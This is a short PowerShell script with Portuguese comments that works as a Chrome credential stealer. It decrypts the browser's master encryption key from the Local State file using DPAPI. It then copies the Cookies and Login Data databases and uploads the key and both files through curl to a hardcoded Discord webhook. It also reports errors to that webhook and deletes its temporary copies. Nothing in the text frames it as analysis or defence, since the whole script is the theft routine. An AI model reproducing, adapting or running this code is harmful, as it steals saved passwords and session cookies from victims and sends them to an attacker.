$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

try {
    # Define a base do Chrome
    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $localStatePath = "$base\Local State"

    # 3. EXTRAÇÃO DA CHAVE
    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKey = $json.os_crypt.encrypted_key
    $allBytes = [Convert]::FromBase64String($encryptedKey)
    $trimmedKey = $allBytes[5..($allBytes.Length - 1)]

    # Descriptografa a chave no contexto do usuário
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $finalKey = [Convert]::ToBase64String($decryptedKey)
    
    # Envia a chave pronta (POST -F resolve o erro de URL malformada)
    curl.exe -X POST -F "content=🔑 CHAVE_MESTRA_PRONTA: $finalKey" $u

    # 4. Envia os arquivos (Cookies e Senhas)
    $paths = @(
        (Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1),
        (Get-ChildItem -Path $base -Recurse -Filter "Login Data" | Select-Object -First 1)
    )

    foreach ($file in $paths) {
        if ($file) {
            $temp = "$env:TEMP\" + $file.Name + ".db"
            Copy-Item $file.FullName $temp -Force
            # Usando -X POST -F aqui também para garantir o envio do arquivo
            curl.exe -X POST -F "file=@$temp" $u
            Remove-Item $temp -Force
        }
    }
} catch {
    $err = $_.Exception.Message
    curl.exe -X POST -F "content=❌ Erro Geral: $err" $u
}
exit
